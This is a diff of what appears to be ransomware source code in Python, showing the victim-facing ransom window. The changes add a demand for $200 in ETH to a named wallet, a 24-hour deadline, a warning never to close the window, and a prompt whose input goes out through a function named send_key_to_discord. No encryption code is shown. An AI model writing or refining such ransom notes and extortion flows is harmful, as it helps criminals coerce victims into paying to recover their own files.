@@ -741,7 +741,7 @@ def popup_message():
         input_window.title("Hello Victim!")
 
         # create a label and an entry field
-        input_label = customtkinter.CTkLabel(input_window, text="Input proof of payment ( ˶ˆᗜˆ˵ )")
+        input_label = customtkinter.CTkLabel(input_window, text="Input your Skred invitation code ( ˶ˆᗜˆ˵ )")
         input_label.pack(pady=10)
 
         input_entry = customtkinter.CTkEntry(input_window)
@@ -750,11 +750,11 @@ def popup_message():
         def process_input():
             user_input = input_entry.get()
             if user_input:
-                my_label.configure(text = f"Your input: \"{user_input}\" \n If everything is in order, you will hear from us soon")
+                my_label.configure(text = f"\n \n Your input: \"{user_input}\"\n Now send the transaction hash of your payment through Skred \n If everything is in order, you will hear from us soon")
                 send_key_to_discord(user_input)
                 my_button.destroy()
             else:
-                my_label.configure(text=f"You have to input something")
+                my_label.configure(text=f"Trying to be funny? You have to input something\n DO NOT CLOSE THIS WINDOW OR YOU CAN NEVER DECRYPT YOUR FILES \n \n Pay us the ransom if you want your files back \n Sent $200 worth of ETH to this Crypto Wallet: 0x7FDdd47BB72DD2F480cec72d2352a7E02a9cff24 \n Get yourself a Skred account and add us: 85ce8027-23f7-456d-883f-26abd40b4784 \n Click the Pay Up! button and type in your Skred invitation code \n If we do not receive the ransom within 24 hrs, you can say bye bye to your files.")
             input_window.destroy()
 
         def close_window():
@@ -772,12 +772,12 @@ def popup_message():
         close_button.pack(side=LEFT, padx=5)
 
     # create a label
-    my_label = customtkinter.CTkLabel(root, text= 'All of your files are encrypted <^.^> \n Pay us the ransom if you want your files back \n Get yourself a Skred account and add this user 85ce8027-23f7-456d-883f-26abd40b4784')
+    my_label = customtkinter.CTkLabel(root, text= "All of your files are encrypted <^.^> \n DO NOT CLOSE THIS WINDOW OR YOU CAN NEVER DECRYPT YOUR FILES \n \n Pay us the ransom if you want your files back \n Sent $200 worth of ETH to this Crypto Wallet: 0x7FDdd47BB72DD2F480cec72d2352a7E02a9cff24 \n Get yourself a Skred account and add us: 85ce8027-23f7-456d-883f-26abd40b4784 \n Click the Pay Up! button and type in your Skred invitation code \n If we do not receive the ransom within 24 hrs, you can say bye bye to your files.")
     my_label.pack(pady = 2)
 
     # create a button
     my_button = customtkinter.CTkButton(root, text="Pay up!", command=input_window)
-    my_button.pack(pady = 150)
+    my_button.pack(pady = 100)
 
 
     root.mainloop()
